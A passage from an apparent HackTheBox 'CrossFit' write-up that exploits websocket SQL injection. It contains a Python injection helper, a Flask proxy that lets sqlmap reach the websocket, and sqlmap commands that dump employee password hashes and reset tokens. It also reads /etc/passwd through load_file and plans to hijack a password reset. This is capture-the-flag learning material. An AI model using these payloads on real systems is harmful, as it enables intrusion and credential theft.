    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">default</span>(self, args):
        <span style="color:#8be9fd;font-style:italic">print</span>(self<span style="color:#ff79c6">.</span>send(args))

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">do_dbs</span>(self, args):
        response <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>send(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;999 union select group_concat(schema_name),2 from information_schema.schemata&#34;</span>)
        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>join(response<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;, &#34;</span>)[<span style="color:#bd93f9">0</span>]<span style="color:#ff79c6">.</span>split()[<span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39;,&#39;</span>)))

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">do_tables</span>(self, args):
        <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(args) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>:
            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] database name is required as argument. run dbs command to list databases.&#34;</span>)
            <span style="color:#ff79c6">return</span>
        response <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>send(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;999 union select group_concat(table_name),2 from information_schema.tables where table_schema=&#39;</span><span style="color:#f1fa8c">{</span>args<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;&#34;</span>)
        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>join(response<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;, &#34;</span>)[<span style="color:#bd93f9">0</span>]<span style="color:#ff79c6">.</span>split()[<span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39;,&#39;</span>)))


term <span style="color:#ff79c6">=</span> Term()
term<span style="color:#ff79c6">.</span>cmdloop()
</code></pre></td></tr></table>
</div>
</div><h4 id="sqlmap--flask">sqlmap + Flask</h4>
<p>sqlmap does not support websocket, so we can instead write a small web app which will convert http sqli into websocket sqli</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> json
<span style="color:#6272a4">#import signal</span>
<span style="color:#ff79c6">import</span> websocket
<span style="color:#ff79c6">from</span> flask <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>

app <span style="color:#ff79c6">=</span> Flask(__name__)

@app<span style="color:#ff79c6">.</span>route(<span style="color:#f1fa8c">&#34;/&#34;</span>)
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">index</span>():
    ws <span style="color:#ff79c6">=</span> websocket<span style="color:#ff79c6">.</span>create_connection(<span style="color:#f1fa8c">&#39;ws://gym.crossfit.htb/ws/&#39;</span>)
    data <span style="color:#ff79c6">=</span> ws<span style="color:#ff79c6">.</span>recv()
    token <span style="color:#ff79c6">=</span> json<span style="color:#ff79c6">.</span>loads(data)[<span style="color:#f1fa8c">&#39;token&#39;</span>]
    params <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>args[<span style="color:#f1fa8c">&#39;params&#39;</span>]
    ws<span style="color:#ff79c6">.</span>send(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{{</span><span style="color:#f1fa8c">&#34;message&#34;:&#34;available&#34;,&#34;params&#34;:&#34;</span><span style="color:#f1fa8c">{</span>params<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;, &#34;token&#34;: &#34;</span><span style="color:#f1fa8c">{</span>token<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">}}</span><span style="color:#f1fa8c">&#39;</span>)
    data <span style="color:#ff79c6">=</span> ws<span style="color:#ff79c6">.</span>recv()
    <span style="color:#ff79c6">return</span> json<span style="color:#ff79c6">.</span>loads(data)[<span style="color:#f1fa8c">&#39;debug&#39;</span>]

<span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
    app<span style="color:#ff79c6">.</span>run(debug<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
</code></pre></td></tr></table>
</div>
</div><p>it works with curl and with sqlmap:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl http://127.0.0.1:5000<span style="color:#f1fa8c">\?</span>params<span style="color:#f1fa8c">\=</span><span style="color:#bd93f9">2</span>
<span style="color:#ff79c6">[</span>id: 2, name: 3-months<span style="color:#ff79c6">]</span>
sqlmap -u http://127.0.0.1:5000/?params<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> --timeout <span style="color:#bd93f9">1</span> --ignore-timeouts --technique<span style="color:#ff79c6">=</span>U --batch
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
sqlmap identified the following injection point<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> with a total of <span style="color:#bd93f9">20</span> HTTP<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> requests:
---
Parameter: params <span style="color:#ff79c6">(</span>GET<span style="color:#ff79c6">)</span>
    Type: UNION query
    Title: Generic UNION query <span style="color:#ff79c6">(</span>NULL<span style="color:#ff79c6">)</span> - <span style="color:#bd93f9">2</span> columns
    Payload: <span style="color:#8be9fd;font-style:italic">params</span><span style="color:#ff79c6">=</span>-3887 UNION ALL SELECT NULL,CONCAT<span style="color:#ff79c6">(</span>CONCAT<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;qbbvq&#39;</span>,<span style="color:#f1fa8c">&#39;JCKvdQIDrHMnCZddhSSZbmtOEddaJmTpwnpMINJr&#39;</span><span style="color:#ff79c6">)</span>,<span style="color:#f1fa8c">&#39;qpxjq&#39;</span><span style="color:#ff79c6">)</span>-- mXvb
---
<span style="color:#ff79c6">[</span>23:49:47<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> testing MySQL
<span style="color:#ff79c6">[</span>23:49:48<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> confirming MySQL
<span style="color:#ff79c6">[</span>23:49:49<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> the back-end DBMS is MySQL
back-end DBMS: MySQL &gt;<span style="color:#ff79c6">=</span> 5.0.0 <span style="color:#ff79c6">(</span>MariaDB fork<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="sqli-enumeration">SQLI Enumeration</h2>
<p>We can now dump the database</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sqlmap -u http://127.0.0.1:5000/?params<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> --timeout <span style="color:#bd93f9">1</span> --ignore-timeouts --technique<span style="color:#ff79c6">=</span>U -p params --batch --dbs
available databases <span style="color:#ff79c6">[</span>3<span style="color:#ff79c6">]</span>:
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> crossfit
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> employees
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> information_schema
</code></pre></td></tr></table>
</div>
</div><p>and dump table names:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sqlmap -u http://127.0.0.1:5000/?params<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> --timeout <span style="color:#bd93f9">1</span> --ignore-timeouts --technique<span style="color:#ff79c6">=</span>U -p params --batch --tables
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
Database: employees
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">2</span> tables<span style="color:#ff79c6">]</span>
+---------------------------------------+
| employees                             |
| password_reset                        |
+---------------------------------------+

Database: crossfit
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">1</span> table<span style="color:#ff79c6">]</span>
+---------------------------------------+
| membership_plans                      |
+---------------------------------------+
</code></pre></td></tr></table>
</div>
</div><p>Dump tables:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sqlmap -u http://127.0.0.1:5000/?params<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> --timeout <span style="color:#bd93f9">1</span> --ignore-timeouts --technique<span style="color:#ff79c6">=</span>U -p params --batch -D crossfit -T membership_plans --dump
sqlmap -u http://127.0.0.1:5000/?params<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> --timeout <span style="color:#bd93f9">1</span> --ignore-timeouts --technique<span style="color:#ff79c6">=</span>U -p params --batch -D employees -T employees --dump
sqlmap -u http://127.0.0.1:5000/?params<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> --timeout <span style="color:#bd93f9">1</span> --ignore-timeouts --technique<span style="color:#ff79c6">=</span>U -p params --batch -D employees -T password_reset --dump
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
Database: employees
Table: employees
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">4</span> entries<span style="color:#ff79c6">]</span>
+----+-----------------------------+---------------+------------------------------------------------------------------+
| id | email                       | username      | password                                                         |
+----+-----------------------------+---------------+------------------------------------------------------------------+
| <span style="color:#bd93f9">1</span>  | david.palmer@crossfit.htb   | administrator | fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 |
| <span style="color:#bd93f9">2</span>  | will.smith@crossfit.htb     | wsmith        | 06b4daca29092671e44ef8fad8ee38783b4294d9305853027d1b48029eac0683 |
| <span style="color:#bd93f9">3</span>  | maria.williams@crossfit.htb | mwilliams     | fe46198cb29909e5dd9f61af986ca8d6b4b875337261bdaa5204f29582462a9c |
| <span style="color:#bd93f9">4</span>  | jack.parker@crossfit.htb    | jparker       | 4de9923aba6554d148dbcd3369ff7c6e71841286e5106a69e250f779770b3648 |
+----+-----------------------------+---------------+------------------------------------------------------------------+
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>00:06:07<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> fetching columns <span style="color:#ff79c6">for</span> table <span style="color:#f1fa8c">&#39;password_reset&#39;</span> in database <span style="color:#f1fa8c">&#39;employees&#39;</span>
<span style="color:#ff79c6">[</span>00:06:07<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> used SQL query returns <span style="color:#bd93f9">3</span> entries
<span style="color:#ff79c6">[</span>00:06:07<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> resumed: <span style="color:#f1fa8c">&#39;email&#39;</span>,<span style="color:#f1fa8c">&#39;varchar(320)&#39;</span>
<span style="color:#ff79c6">[</span>00:06:07<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> resumed: <span style="color:#f1fa8c">&#39;token&#39;</span>,<span style="color:#f1fa8c">&#39;varchar(64)&#39;</span>
<span style="color:#ff79c6">[</span>00:06:07<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> resumed: <span style="color:#f1fa8c">&#39;expires&#39;</span>,<span style="color:#f1fa8c">&#39;timestamp&#39;</span>
<span style="color:#ff79c6">[</span>00:06:07<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>INFO<span style="color:#ff79c6">]</span> fetching entries <span style="color:#ff79c6">for</span> table <span style="color:#f1fa8c">&#39;password_reset&#39;</span> in database <span style="color:#f1fa8c">&#39;employees&#39;</span>
<span style="color:#ff79c6">[</span>00:06:07<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>WARNING<span style="color:#ff79c6">]</span> unable to retrieve the entries <span style="color:#ff79c6">for</span> table <span style="color:#f1fa8c">&#39;password_reset&#39;</span> in database <span style="color:#f1fa8c">&#39;employees&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>Attempt te retrieve user privileges shows we can read files:</p>
<pre tabindex="0"><code>database management system users privileges:
[*] 'crossfit_user'@'localhost' [1]:
    privilege: FILE
</code></pre><ul>
<li>The password_reset table is empty</li>
<li>Bruteforce passwords did not work</li>
<li>reset password may be possible as we know the admin email address</li>
<li>File enumeration is possible:
<ul>
<li>sqlmap -u http://127.0.0.1:5000/?params=1 &ndash;timeout 10 &ndash;technique=U -p params &ndash;batch &ndash;file-read=/etc/passwd</li>
<li>999 union select load_file('/etc/passwd'),2 from information_schema.user_privileges</li>
</ul>
</li>
</ul>
<h2 id="file-enumeration">File enumeration</h2>
<p>resolv.conf reveals the server is using its own DNS</p>
<pre tabindex="0"><code class="language-resolv.conf" data-lang="resolv.conf">lookup file bind
#nameserver 8.8.8.8
nameserver 127.0.0.1
</code></pre><p>/etc/passwd</p>
<pre tabindex="0"><code class="language-/etc/passwd" data-lang="/etc/passwd">[..]
lucille:_:1002:1002:,,,:/home/lucille:/bin/csh
node:_:1003:1003::/home/node:/bin/ksh
\_redis:_:686:686:redis account:/var/redis:/sbin/nologin
david:_:1004:1004:,,,:/home/david:/bin/csh
john:\*:1005:1005::/home/john:/bin/csh
</code></pre><h3 id="password-resetphp">password-reset.php</h3>
<p>On OpenBSD, there is no /var/www/html/index.php, and therefore we have to read /etc/httpd.conf config file, to figure out webRoot location:</p>
<ul>
<li>port 8000: /htdocs index.html,index.php</li>
<li>port 8001: /htdocs_employees PHP website</li>
<li>port 8002: /htdocs_chat websocket?</li>
</ul>
<p>We can&rsquo;t read /htdocs_employees/password-reset.php</p>
<p>We don&rsquo;t see port 80 here, so there must be some reverse proxy. A quick research help identify <a href="https://man.openbsd.org/relayd.conf.5">relayd manpages</a></p>
<h3 id="etcrelaydconf">/etc/relayd.conf</h3>
<p>We discosver for port 80:</p>
<ul>
<li>new domain: *crossfit-club.htb on port 9999</li>
<li>domin *employees.crossfit.htb on port 8001</li>
<li>/wsi* is on port 4419</li>
<li>other domains on port 8000
For traffic on 127.0.0.1:9999, we have:</li>
<li>static html resources on port 8002</li>
<li>non-static resources on port 5000 on 127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4</li>
</ul>
<pre tabindex="0"><code class="language-conf" data-lang="conf">table&lt;1&gt;{127.0.0.1}
table&lt;2&gt;{127.0.0.1}
table&lt;3&gt;{127.0.0.1}
table&lt;4&gt;{127.0.0.1}
http protocol web{
        pass request quick header &quot;Host&quot; value &quot;*crossfit-club.htb&quot; forward to &lt;3&gt;
        pass request quick header &quot;Host&quot; value &quot;*employees.crossfit.htb&quot; forward to &lt;2&gt;
        match request path &quot;/*&quot; forward to &lt;1&gt;
        match request path &quot;/ws*&quot; forward to &lt;4&gt;
        http websockets
}

table&lt;5&gt;{127.0.0.1}
table&lt;6&gt;{127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4}
http protocol portal{
        pass request quick path &quot;/&quot; forward to &lt;5&gt;
        pass request quick path &quot;/index.html&quot; forward to &lt;5&gt;
        pass request quick path &quot;/home&quot; forward to &lt;5&gt;
        pass request quick path &quot;/login&quot; forward to &lt;5&gt;
        pass request quick path &quot;/chat&quot; forward to &lt;5&gt;
        pass request quick path &quot;/js/*&quot; forward to &lt;5&gt;
        pass request quick path &quot;/css/*&quot; forward to &lt;5&gt;
        pass request quick path &quot;/fonts/*&quot; forward to &lt;5&gt;
        pass request quick path &quot;/images/*&quot; forward to &lt;5&gt;
        pass request quick path &quot;/favicon.ico&quot; forward to &lt;5&gt;
        pass forward to &lt;6&gt;
        http websockets
}

relay web{
        listen on &quot;0.0.0.0&quot; port 80
        protocol web
        forward to &lt;1&gt; port 8000
        forward to &lt;2&gt; port 8001
        forward to &lt;3&gt; port 9999
        forward to &lt;4&gt; port 4419
}

relay portal{
        listen on 127.0.0.1 port 9999
        protocol portal
        forward to &lt;5&gt; port 8002
        forward to &lt;6&gt; port 5000 mode source-hash
}
</code></pre><h2 id="password-reset">password reset</h2>
<p>Now that we know valid email addresses, we attempt admin password reset on <code>password-reset.php</code> and we obtain the message: <code>Reset link sent, please check your email.</code></p>
<p>Further check on the database shows the valid token:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">python3 helper.py
injection<span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">999</span> <span style="color:#ff79c6">union</span> <span style="color:#ff79c6">select</span> <span style="color:#ff79c6">count</span>(\<span style="color:#ff79c6">*</span>), email <span style="color:#ff79c6">from</span> employees.password_reset
[id: <span style="color:#bd93f9">1</span>, name: david.palmer<span style="color:#ff79c6">@</span>crossfit.htb]
injection<span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">999</span> <span style="color:#ff79c6">union</span> <span style="color:#ff79c6">select</span> token, expires <span style="color:#ff79c6">from</span> employees.password_reset
[id: f6fd84de2f7bb729ea00eefa27429c42a50502338eeb49e5b6661910457d4638, name: <span style="color:#bd93f9">2021</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">09</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">05</span> <span style="color:#bd93f9">17</span>:<span style="color:#bd93f9">45</span>:<span style="color:#bd93f9">39</span>]
injection<span style="color:#ff79c6">&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>An educated guess for the format of the reset link received by the admin: it should be</p>
<pre tabindex="0"><code>http://employees.crossfit.htb/password-reset.php?token={token}
</code></pre><p>We try the below but it says <code>Invalid token</code>, which somehow confirms our educated guess of the format is correct. Indeed, changing the parameter name results in no error message.</p>
<pre tabindex="0"><code>http://employees.crossfit.htb/password-reset.php?token=f6fd84de2f7bb729ea00eefa27429c42a50502338eeb49e5b6661910457d4638
</code></pre><p>Our best bet is that the database store a SHA256 of the token but not the token itself!
The only way to get the Token is to receive the email&hellip; If we have control on the local DNS server, then we could perhaps redirect the email to our attack machine?</p>
<h2 id="crossfit-clubhtb">crossfit-club.htb</h2>
<p>We have a login page and a signup page but the signup button is disabled</p>
<p>To enable the signup, we can inspect the code on Firefox and remove the class v-btn&ndash;disabled class and disabled property. However nothing happens.</p>
<p>On burp we find:</p>
<ul>
<li>GET /api/auth
<ul>
<li><code>X-Powered-By: Express</code> indicative of nodejs running on port 5000</li>
